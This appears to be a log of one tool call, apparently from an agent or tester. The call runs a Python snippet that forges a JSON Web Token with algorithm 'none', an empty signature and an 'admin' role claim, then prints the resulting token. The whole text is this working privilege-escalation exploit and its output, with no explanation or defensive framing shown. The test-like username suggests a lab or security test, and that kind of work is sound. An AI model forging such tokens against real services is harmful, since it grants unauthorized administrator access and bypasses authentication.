@@ -1,0 +1,23 @@
+# command: cd /work && python3 -c "
+import base64
+import json
+
+# Create alg=none token
+header = {'alg': 'none', 'typ': 'JWT'}
+payload = {'user_id': 'd8752136-5101-46f9-ba89-d285071396da', 'username': 'testuser_new', 'role': 'admin', 'exp': 1790701098}
+
+header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
+payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
+
+# For alg=none, signature is empty
+token = f'{header_b64}.{payload_b64}.'
+print('Forged token (alg=none, role=admin):')
+print(token)
+"
+# tool: python3
+# exit_code: 0
+# ts: 2026-09-29T16:35:40.779018+00:00
+# ---
+
+Forged token (alg=none, role=admin):
+eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VyX2lkIjogImQ4NzUyMTM2LTUxMDEtNDZmOS1iYTg5LWQyODUwNzEzOTZkYSIsICJ1c2VybmFtZSI6ICJ0ZXN0dXNlcl9uZXciLCAicm9sZSI6ICJhZG1pbiIsICJleHAiOiAxNzkwNzAxMDk4fQ.
